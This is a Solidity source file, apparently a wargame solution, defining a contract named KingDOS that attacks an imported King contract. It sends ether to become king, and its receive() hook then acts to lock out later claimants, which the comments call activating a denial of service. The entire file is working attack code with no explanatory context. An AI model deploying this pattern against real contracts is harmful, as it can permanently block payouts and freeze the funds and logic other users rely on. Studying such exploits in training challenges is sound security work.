pragma solidity ^0.6.0;

import "./King.sol";

contract KingDOS {
    constructor() public payable {}

    function denialOfService(address payable _to, uint _amount) public {
        _to.call.value(_amount)("");
    }

    receive() external payable {
        if (King(msg.sender)._king() != address(this)){
            // if we are not king yet, do nothing
        }else{
            // if we are king, activate denial of service
            payable(msg.sender).call.value(1)("");
        }
    }
}
